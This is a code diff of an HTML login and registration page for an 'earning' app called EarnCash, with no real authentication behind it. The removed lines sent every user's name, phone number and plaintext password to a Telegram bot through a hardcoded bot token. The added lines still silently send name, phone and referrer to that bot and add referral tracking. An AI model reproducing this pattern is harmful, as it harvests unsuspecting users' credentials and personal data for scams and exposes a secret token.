@@ -3,29 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login & Register - Soap Earning App</title>
+    <title>Login & Register - EarnCash</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
         :root { --primary: #0066ff; --bg: #f4f7fe; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
         body { background: var(--bg); display: flex; align-items: center; justify-content: center; height: 100vh; padding: 20px; }
-        
         .auth-container { background: white; width: 100%; max-width: 400px; padding: 35px 25px; border-radius: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.08); text-align: center; }
         .logo { font-size: 32px; margin-bottom: 10px; display: block; }
         h2 { font-size: 24px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
         p { font-size: 14px; color: #777; margin-bottom: 25px; }
-
         .form-group { margin-bottom: 18px; text-align: left; }
         .form-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #555; }
         .form-group input { width: 100%; padding: 14px; border: 1.5px solid #ebebeb; border-radius: 14px; font-size: 15px; outline: none; transition: 0.3s; background: #fafafa; }
         .form-group input:focus { border-color: var(--primary); background: white; box-shadow: 0 0 0 4px rgba(0,102,255,0.05); }
-
         .main-btn { width: 100%; background: var(--primary); color: white; border: none; padding: 16px; border-radius: 14px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; transition: 0.3s; }
-        .main-btn:active { transform: scale(0.97); }
-
         .toggle-text { margin-top: 25px; font-size: 14px; color: #666; }
         .toggle-text span { color: var(--primary); font-weight: 700; cursor: pointer; text-decoration: underline; }
-        
         .hidden { display: none; }
     </style>
 </head>
@@ -34,7 +28,7 @@
     <div class="auth-container">
         <span class="logo">🧼</span>
         <h2 id="title">Create Account</h2>
-        <p id="subtitle">Start your soap earning journey!</p>
+        <p id="subtitle">Start your earning journey!</p>
 
         <div id="reg-only" class="form-group">
             <label>Full Name</label>
@@ -60,10 +54,13 @@
 
     <script>
         let mode = 'register'; 
+        
+        // URL se referral code (phone) nikalna
+        const urlParams = new URLSearchParams(window.location.search);
+        const referrer = urlParams.get('ref');
 
         function switchMode() {
             const title = document.getElementById('title');
-            const subtitle = document.getElementById('subtitle');
             const regField = document.getElementById('reg-only');
             const btnText = document.getElementById('btn-text');
             const toggleMsg = document.getElementById('toggle-msg');
@@ -71,14 +68,12 @@
             if (mode === 'register') {
                 mode = 'login';
                 title.innerText = "Welcome Back";
-                subtitle.innerText = "Login to access your plans";
                 regField.classList.add('hidden');
                 btnText.innerText = "Login Now";
                 toggleMsg.innerHTML = "Don't have an account? <span onclick='switchMode()'>Register</span>";
             } else {
                 mode = 'register';
                 title.innerText = "Create Account";
-                subtitle.innerText = "Start your soap earning journey!";
                 regField.classList.remove('hidden');
                 btnText.innerText = "Register Now";
                 toggleMsg.innerHTML = "Already have an account? <span onclick='switchMode()'>Login</span>";
@@ -90,47 +85,30 @@
             const password = document.getElementById('pass').value;
             const name = document.getElementById('name').value;
 
-            if (phone.length < 10) {
-                alert("Please enter a valid 10-digit mobile number!");
-                return;
-            }
-            if (password.length < 4) {
-                alert("Password must be at least 4 characters!");
-                return;
-            }
-            if (mode === 'register' && name === "") {
-                alert("Please enter your name!");
-                return;
-            }
+            if (phone.length < 10) { alert("Invalid Number!"); return; }
+            if (password.length < 4) { alert("Short Password!"); return; }
 
-            // Data Save karna
+            // Data Save
             localStorage.setItem('userPhone', phone);
-            let finalName = name;
             if(mode === 'register') {
                 localStorage.setItem('userName', name);
-            } else {
-                finalName = localStorage.getItem('userName') || 'Old User';
+                
+                // --- REFERRAL TRACKING LOGIC ---
+                if (referrer && referrer !== phone) {
+                    let refList = JSON.parse(localStorage.getItem('myRefList') || '[]');
+                    refList.push({ name: name, phone: phone });
+                    localStorage.setItem('myRefList', JSON.stringify(refList));
+                }
             }
 
-            // --- TELEGRAM NOTIFICATION SYSTEM ---
             const token = "7682752151:AAHnHH8fHvNmLoCIAMPlZ_I88esXwy6b53E";
             const chat_id = "8415600127";
-            
-            const message = `👤 *USER ACTIVITY*\n\n📌 Mode: ${mode.toUpperCase()}\n📛 Name: ${finalName}\n📞 Phone: ${phone}\n🔑 Pass: ${password}\n🕒 Time: ${new Date().toLocaleString()}`;
+            const msg = `👤 *USER ACTIVITY*\n\n📌 Mode: ${mode.toUpperCase()}\n📛 Name: ${name || 'Old User'}\n📞 Phone: ${phone}\n🔗 Referred By: ${referrer || 'Direct'}`;
 
-            const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-
-            // Button loading state
             document.getElementById('btn-text').innerText = "Processing...";
 
-            fetch(telegramUrl)
-            .then(() => {
-                window.location.href = "plans.html";
-            })
-            .catch(() => {
-                // Fallback agar API slow ho
-                window.location.href = "plans.html";
-            });
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
+            .then(() => { window.location.href = "home.html"; });
         }
     </script>
 </body>
